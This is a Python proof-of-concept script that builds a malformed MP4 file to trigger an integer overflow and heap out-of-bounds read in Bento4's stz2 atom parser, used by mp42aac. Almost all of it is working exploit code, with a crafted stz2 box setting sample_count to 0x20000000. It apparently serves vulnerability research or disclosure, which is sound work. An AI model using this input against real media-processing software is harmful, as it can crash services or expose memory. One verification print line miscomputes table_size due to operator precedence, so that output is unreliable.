#!/usr/bin/env python3
"""
PoC generator for VULN 002: AP4_Stz2Atom table_size 32-bit integer overflow
leading to heap OOB read in Bento4's mp42aac.

Vulnerability: In Ap4Stz2Atom.cpp lines 90-92, table_size = (sample_count *
m_FieldSize + 7) / 8 with m_FieldSize=8 and sample_count=0x20000000:
0x20000000 * 8 = 0x100000000 overflows 32-bit to 0, so table_size = 0.
The size check (table_size+8) > size becomes 8 > size, which passes for
size >= 8. Then new unsigned char[0] allocates 0 bytes, but the for loop
iterates 0x20000000 times accessing buffer[i] — heap OOB read.
"""

import struct
import os

OUTDIR = os.path.dirname(os.path.abspath(__file__))
OUTFILE = os.path.join(OUTDIR, "vuln_002.mp4")


def box(fourcc, payload):
    """Create an MP4 box: 4-byte size + 4-byte type + payload."""
    assert len(fourcc) == 4
    size = 8 + len(payload)
    return struct.pack(">I", size) + fourcc + payload


def fullbox(fourcc, version, flags, payload):
    """Create a FullBox: box with version(1) + flags(3) prefix."""
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(fourcc, fb_payload)


def build_ftyp():
    # ftyp: size=20, major_brand='isom', minor_version=0, compatible=['isom']
    payload = b"isom" + struct.pack(">I", 0) + b"isom"
    return box(b"ftyp", payload)


def build_mvhd():
    # mvhd version 0: creation_time(4), modification_time(4), timescale(4),
    # duration(4), rate(4), volume(2), reserved(10), matrix(36),
    # pre_defined(24), next_track_id(4)
    payload = struct.pack(">IIII", 0, 0, 1000, 0)  # times, timescale, duration
    payload += struct.pack(">I", 0x00010000)  # rate = 1.0
    payload += struct.pack(">H", 0x0100)     # volume = 1.0
    payload += b"\x00" * 10                  # reserved
    payload += b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # matrix row1
    payload += b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"  # matrix row2
    payload += b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00"  # matrix row3
    payload += b"\x00" * 24                  # pre_defined
    payload += struct.pack(">I", 2)          # next_track_id
    return fullbox(b"mvhd", 0, 0, payload)


def build_tkhd():
    # tkhd version 0: creation_time(4), modification_time(4), track_id(4),
    # reserved(4), duration(4), reserved2(8), layer(2), alternate_group(2),
    # volume(2), reserved3(2), matrix(36), width(4), height(4)
    payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)  # times, track_id, reserved, duration
    payload += b"\x00" * 8                   # reserved2
    payload += struct.pack(">HHH", 0, 0, 0)  # layer, alt_group, volume
    payload += b"\x00" * 2                   # reserved3
    payload += b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # matrix
    payload += b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    payload += b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00"
    payload += struct.pack(">II", 0, 0)      # width, height
    return fullbox(b"tkhd", 0, 3, payload)   # flags=3: track enabled + in movie


def build_mdhd():
    # mdhd version 0: creation_time(4), modification_time(4), timescale(4),
    # duration(4), language(2), pre_defined(2)
    payload = struct.pack(">IIII", 0, 0, 44100, 0)
    payload += struct.pack(">HH", 0x55C4, 0)  # language='und', pre_defined=0
    return fullbox(b"mdhd", 0, 0, payload)


def build_hdlr():
    # hdlr: pre_defined(4), handler_type(4), reserved(12), name(variable+\0)
    payload = struct.pack(">I", 0)   # pre_defined
    payload += b"soun"               # handler_type
    payload += b"\x00" * 12         # reserved
    payload += b"\x00"              # name (empty string, null terminated)
    return fullbox(b"hdlr", 0, 0, payload)


def build_smhd():
    # smhd: balance(2), reserved(2)
    payload = struct.pack(">HH", 0, 0)
    return fullbox(b"smhd", 0, 0, payload)


def build_dref():
    # dref: entry_count(4) + url entry
    url_payload = struct.pack(">I", 1)  # entry_count=1
    # url box with self-contained flag
    url_entry = fullbox(b"url ", 0, 1, b"")  # flags=1 = self-contained
    url_payload += url_entry
    return fullbox(b"dref", 0, 0, url_payload)


def build_dinf():
    return box(b"dinf", build_dref())


def build_stsd():
    # stsd: entry_count(4), no entries
    payload = struct.pack(">I", 0)
    return fullbox(b"stsd", 0, 0, payload)


def build_stts():
    # stts: entry_count(4), no entries
    payload = struct.pack(">I", 0)
    return fullbox(b"stts", 0, 0, payload)


def build_stz2():
    """
    Build the malicious stz2 box.
    Layout: version(1) + flags(3) + reserved(4) + field_size(1) + sample_count(4)
    Total full box size = 8 (box header) + 4 (ver+flags) + 4 (reserved) + 1 (field_size) + 4 (sample_count)
                       = 21 bytes
    With field_size=8 and sample_count=0x20000000:
      table_size = (0x20000000 * 8 + 7) / 8 in 32-bit = (0 + 7) / 8 = 0
    """
    FIELD_SIZE = 8
    SAMPLE_COUNT = 0x20000000

    # FullBox payload after version+flags:
    payload = struct.pack(">I", 0)              # reserved (4 bytes)
    payload += struct.pack(">B", FIELD_SIZE)    # field_size (1 byte) = 8
    payload += struct.pack(">I", SAMPLE_COUNT)  # sample_count (4 bytes) = 0x20000000

    return fullbox(b"stz2", 0, 0, payload)


def build_stsc():
    payload = struct.pack(">I", 0)
    return fullbox(b"stsc", 0, 0, payload)


def build_stco():
    payload = struct.pack(">I", 0)
    return fullbox(b"stco", 0, 0, payload)


def build_stbl():
    content = (
        build_stsd() +
        build_stts() +
        build_stz2() +
        build_stsc() +
        build_stco()
    )
    return box(b"stbl", content)


def build_minf():
    content = build_smhd() + build_dinf() + build_stbl()
    return box(b"minf", content)


def build_mdia():
    content = build_mdhd() + build_hdlr() + build_minf()
    return box(b"mdia", content)


def build_trak():
    content = build_tkhd() + build_mdia()
    return box(b"trak", content)


def build_moov():
    content = build_mvhd() + build_trak()
    return box(b"moov", content)


def main():
    data = build_ftyp() + build_moov()
    with open(OUTFILE, "wb") as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUTFILE}")

    # Verify the stz2 box parameters
    stz2 = build_stz2()
    print(f"[+] stz2 box: size={len(stz2)}, field_size=8, sample_count=0x20000000")
    print(f"[+] Integer overflow check: 0x20000000 * 8 = {0x20000000 * 8:#x}")
    print(f"[+] In 32-bit: {(0x20000000 * 8) & 0xFFFFFFFF:#x}")
    print(f"[+] table_size = ({(0x20000000 * 8) & 0xFFFFFFFF} + 7) / 8 = {((0x20000000 * 8) & 0xFFFFFFFF + 7) // 8}")


if __name__ == "__main__":
    main()
